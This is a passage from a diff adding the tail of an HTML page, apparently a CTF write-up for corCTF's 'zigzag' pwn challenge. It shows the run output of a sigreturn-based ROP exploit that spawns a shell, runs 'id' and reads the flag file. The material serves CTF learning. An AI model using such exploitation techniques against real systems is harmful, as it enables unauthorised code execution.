+</span><span style="color:#f1fa8c">[*] stack: 0x7ffe21d2cc68
+</span><span style="color:#f1fa8c">[*] Loaded 37 cached gadgets for &#39;zigzag&#39;
+</span><span style="color:#f1fa8c">[*] Using sigreturn for &#39;SYS_execve&#39;
+</span><span style="color:#f1fa8c">[*] Switching to interactive mode
+</span><span style="color:#f1fa8c">$ id
+</span><span style="color:#f1fa8c">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+</span><span style="color:#f1fa8c">$ cat flag.txt
+</span><span style="color:#f1fa8c">corctf{bl4Z1nGlY_f4sT!!}
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
